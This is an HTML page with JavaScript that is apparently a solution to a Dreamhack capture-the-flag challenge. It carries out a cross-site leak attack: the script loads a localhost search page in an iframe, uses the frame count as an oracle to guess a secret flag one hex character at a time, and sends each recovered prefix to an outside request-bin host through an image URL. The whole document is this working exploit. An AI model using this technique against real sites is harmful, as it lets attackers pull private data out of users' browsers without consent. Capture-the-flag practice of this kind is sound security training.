<!DOCTYPE html>
<html>
<head>
    <title>Example</title>
</head>
<body>
<iframe id="frame"></iframe>
<img id="img">
<script>
    function req(url) {
        return new Promise((resolve, reject) => {
            var iframe = document.getElementById("frame");
            iframe.src = url;

            iframe.onload = () => { 
                if(iframe.contentWindow.frames.length>=1) resolve();
                else reject();
            };
        });
    }

    async function sendrequest(query) {
        try {
            await req("http://localhost:8000/search?query="+query);
            return true;
        } catch(e) {
            return false;
        }
    }

    var flag = "DH{"
    var charset = "0123456789abcdef"

    async function exploit() {
        for(var i=0; i<32; i++) {
            for(const ch of charset) {
                if(await sendrequest(flag+ch)) {
                    flag += ch;
                    var img = document.getElementById("img");
                    img.src = "https://nnxcfpn.request.dreamhack.games/?"+flag;
                    break;
                }
            }
        }
    }

    exploit()
</script>
</body>
</html>
